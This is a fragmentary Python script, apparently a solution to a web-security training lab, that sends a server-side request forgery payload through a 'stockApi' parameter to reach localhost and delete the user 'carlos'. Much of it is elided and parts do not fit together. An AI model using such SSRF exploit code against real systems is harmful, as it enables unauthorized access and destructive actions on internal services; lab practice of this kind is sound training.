...
def del_user(url):
    ...
    r = requests.post(url + path, data=ssrf_payload,verify=False)
    #print(r)
...
def check_exploit(url):
    ...
    check_para = "http://localhost"
    params = {"stockApi" : check_para}
    r = requests.post(url + path, data=ssrf_payload,verify=False)
   
    if "User deleted successfully" in r.text:
        print("[+] User carlos deleted successfully")
    else:
        print("[-] Exploitation failed or user does not exist.")
def main():
    url = sys.argv[1]
    argv_check()
